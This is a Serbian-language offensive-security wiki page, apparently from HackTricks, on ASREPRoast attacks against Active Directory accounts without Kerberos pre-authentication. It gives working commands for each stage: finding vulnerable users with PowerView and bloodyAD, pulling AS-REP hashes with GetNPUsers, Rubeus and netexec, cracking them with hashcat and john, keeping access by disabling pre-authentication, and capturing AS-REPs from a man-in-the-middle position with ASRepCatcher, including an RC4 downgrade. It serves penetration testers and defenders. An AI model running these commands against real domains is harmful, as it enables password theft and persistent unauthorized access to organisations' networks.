# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast je sigurnosni napad koji iskorišćava korisnike koji nemaju **Kerberos pre-authentication required attribute**. U suštini, ova ranjivost omogućava napadačima da zatraže autentifikaciju za korisnika od Domain Controller (DC) bez potrebe za korisnikovom lozinkom. DC zatim odgovara porukom šifrovanom ključem izvedenim iz korisnikove lozinke, koju napadači mogu pokušati da razbiju offline kako bi otkrili korisnikovu lozinku.

Glavni zahtevi za ovaj napad su:

- **Lack of Kerberos pre-authentication**: Ciljni korisnici ne smeju imati ovu bezbednosnu funkciju omogućenu.
- **Connection to the Domain Controller (DC)**: Napadači moraju imati pristup DC kako bi slali zahteve i primali šifrovane poruke.
- **Opcionalan domenski nalog**: Imati domenski nalog omogućava napadačima da efikasnije identifikuju ranjive korisnike kroz LDAP upite. Bez takvog naloga, napadači moraju da pogađaju korisnička imena.

#### Enumeracija ranjivih korisnika (zahteva domenske kredencijale)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Zatraži AS_REP poruku
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus će generisati događaj 4768 sa tipom enkripcije 0x17 i preauth tipom 0.

#### Kratke jednolinijske naredbe (Linux)

- Najpre enumerišite potencijalne mete (npr. iz leaked build paths) pomoću Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Preuzmite AS-REP za pojedinačnog korisnika čak i sa **praznom** lozinkom koristeći `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec takođe prikazuje LDAP signing/channel binding posture).
- Krekovanje pomoću `hashcat out.asreproast /path/rockyou.txt` – automatski prepoznaje **-m 18200** (etype 23) za AS-REP roast hashes.

### Krekovanje
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Održavanje pristupa

Prinudno podesite **preauth** da nije potreban za korisnika za kojeg imate **GenericAll** dozvole (ili dozvole za pisanje svojstava):
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast bez kredencijala

Napadač može iskoristiti man-in-the-middle poziciju da presretne AS-REP pakete dok prolaze mrežom, bez oslanjanja na to da je Kerberos pre-authentication onemogućen. Stoga ovo radi za sve korisnike na VLAN-u.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nam to omogućava. Štaviše, alat prisiljava klijentske radne stanice da koriste RC4 menjajući Kerberos pregovaranje.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Reference

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
